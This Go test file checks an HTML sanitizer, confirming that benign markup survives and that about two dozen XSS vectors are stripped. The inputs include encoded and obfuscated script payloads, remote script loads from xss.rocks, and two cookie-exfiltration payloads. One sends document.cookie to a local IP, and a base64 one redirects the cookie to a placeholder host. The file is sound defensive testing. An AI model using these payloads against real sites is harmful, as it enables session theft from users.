package inputsanitizer

import (
	"testing"
)

func TestInputSanitizer_Sanitize(t *testing.T) {
	sanitizer := NewInputSanitizer()

	tests := []struct {
		name     string
		input    string
		expected string
	}{
		{
			name:     "Querystring with script",
			input:    `http://example.com/posts?sort=<script>alert(“XSS”)</script>`,
			expected: `http://example.com/posts?sort=`,
		},
		{
			name:     "URL with script",
			input:    `http://localhost:81/vulnerabilities/xss_r/?name=<script>new Image().src="http://192.168.0.252:82/bogus.php?output="+document.cookie;</script>`,
			expected: `http://localhost:81/vulnerabilities/xss_r/?name=`,
		},
		{
			name:     "Normal paragraph",
			input:    `<p>This is a normal paragraph.</p>`,
			expected: `<p>This is a normal paragraph.</p>`,
		},
		{
			name:     "Bold text",
			input:    `<b>This is bold text</b>`,
			expected: `<b>This is bold text</b>`,
		},
		{
			name:     "Italic text",
			input:    `<i>This is italic text</i>`,
			expected: `<i>This is italic text</i>`,
		},
		{
			name:     "Underline text",
			input:    `<u>This is underlined text</u>`,
			expected: `<u>This is underlined text</u>`,
		},
		{
			name:     "Strong text",
			input:    `<strong>This is strong text</strong>`,
			expected: `<strong>This is strong text</strong>`,
		},
		{
			name:     "Emphasis text",
			input:    `<em>This is emphasized text</em>`,
			expected: `<em>This is emphasized text</em>`,
		},
		{
			name:     "Normal link",
			input:    `<a href="https://example.com">This is a normal link</a>`,
			expected: `<a href="https://example.com">This is a normal link</a>`,
		},
		{
			name:     "Image with alt text",
			input:    `<img src="image.jpg" alt="An example image">`,
			expected: `<img src="image.jpg" alt="An example image">`,
		},
		{
			name:     "Nested tags",
			input:    `<p>This is <b>bold text</b> inside a <i>paragraph with <u>underlined</u> italic text</i>.</p>`,
			expected: `<p>This is <b>bold text</b> inside a <i>paragraph with <u>underlined</u> italic text</i>.</p>`,
		},
		{
			name:     "Line break",
			input:    `Line 1<br>Line 2`,
			expected: `Line 1<br>Line 2`,
		},
		{
			name:     "Line break2",
			input:    `Line 1<br />Line 2`,
			expected: `Line 1<br />Line 2`,
		},
		{
			name:     "Normal links should be accepted",
			input:    `<a>link</a>`,
			expected: `<a>link</a>`,
		},
		{
			name:     "Unordered list",
			input:    `<ul><li>Item 1</li><li>Item 2</li></ul>`,
			expected: `<ul><li>Item 1</li><li>Item 2</li></ul>`,
		},
		{
			name:     "Basic XSS Test",
			input:    `<SCRIPT SRC=https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js></SCRIPT>`,
			expected: ``,
		},
		{
			name:     "XSS Locator (Polyglot)",
			input:    `javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(42);//'>`,
			expected: `javascript:/*--&gt;`,
		},
		{
			name:     "Malformed A Tags",
			input:    `<a onmouseover="alert(document.cookie)">xxs link</a>`,
			expected: `<a>xxs link</a>`,
		},
		{
			name:     "Malformed IMG Tags",
			input:    `<IMG """"><SCRIPT>alert("XSS")</SCRIPT>">`,
			expected: `<img>"&gt;`,
		},
		{
			name:     "fromCharCode",
			input:    `<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>`,
			expected: `<img>`,
		},
		{
			name:     "Default SRC Tag",
			input:    `<IMG SRC=# onmouseover="alert('xxs')">`,
			expected: `<img src="">`,
		},
		{
			name:     "On Error Alert",
			input:    `<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>`,
			expected: `<img src="/"></img>`,
		},
		{
			name:     "IMG onerror and JavaScript Alert Encode",
			input:    `<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">`,
			expected: `<img src="x">`,
		},
		{
			name:     "Decimal HTML Character References",
			input:    `<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>`,
			expected: `<img>`,
		},
		{
			name:     "Embedded Tab",
			input:    `<IMG SRC="jav   ascript:alert('XSS');">`,
			expected: `<img>`,
		},
		{
			name:     "Embedded Encoded Tab",
			input:    `<IMG SRC="jav&#x09;ascript:alert('XSS');">`,
			expected: `<img>`,
		},
		{
			name:     "Embedded Newline",
			input:    `<IMG SRC="jav&#x0A;ascript:alert('XSS');">`,
			expected: `<img>`,
		},
		{
			name:     "Embedded Carriage Return",
			input:    `<IMG SRC="jav&#x0D;ascript:alert('XSS');">`,
			expected: `<img>`,
		},
		{
			name:     "Null Chars",
			input:    `<IMG SRC=java\0script:alert("XSS")>`,
			expected: `<img>`,
		},
		{
			name:     "Spaces and Meta Chars",
			input:    `<IMG SRC=" &#14;  javascript:alert('XSS');">`,
			expected: `<img>`,
		},
		{
			name:     "Half Open HTML/JavaScript XSS Vector",
			input:    `<IMG SRC="javascript:alert('XSS')"`,
			expected: ``,
		},
		{
			name:     "Double Open Angle Bracket",
			input:    `<<SCRIPT>alert("XSS");//<</SCRIPT>`,
			expected: `alert("XSS");//`,
		},
		{
			name:     "Extraneous Open Brackets",
			input:    `<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>`,
			expected: ``,
		},
		{
			name:     "No Closing Script Tags",
			input:    `<SCRIPT SRC=http://xss.rocks/xss.js?< B >`,
			expected: ``,
		},
		{
			name:     "Protocol Resolution in Script Tags",
			input:    `<SCRIPT SRC=//xss.rocks/.j>`,
			expected: ``,
		},
		{
			name:     "ECMAScript 6",
			input:    "<SCRIPT>Set.constructor`alert\x28document.domain\x29`</SCRIPT>",
			expected: "",
		},
		{
			name:     "BODY Tag",
			input:    `<BODY ONLOAD=alert('XSS')>`,
			expected: ``,
		},
		{
			name:     "SVG Object Tag",
			input:    `<svg/onload=alert('XSS')>`,
			expected: ``,
		},
		{
			name:     "Base64 Encoded",
			input:    `<img onload="eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))">`,
			expected: `<img>`,
		},
		{
			name:     "WAF Bypass String",
			input:    `<Img src = x onerror = "javascript: window.onerror = alert; throw XSS">`,
			expected: `<img src="x">`,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := sanitizer.Sanitize(tt.input)
			if result != tt.expected {
				t.Errorf("Sanitize failed.\nInput=|%v|,\nOutput=|%v|,\nWant=|%v|", tt.input, result, tt.expected)
			}
		})
	}
}
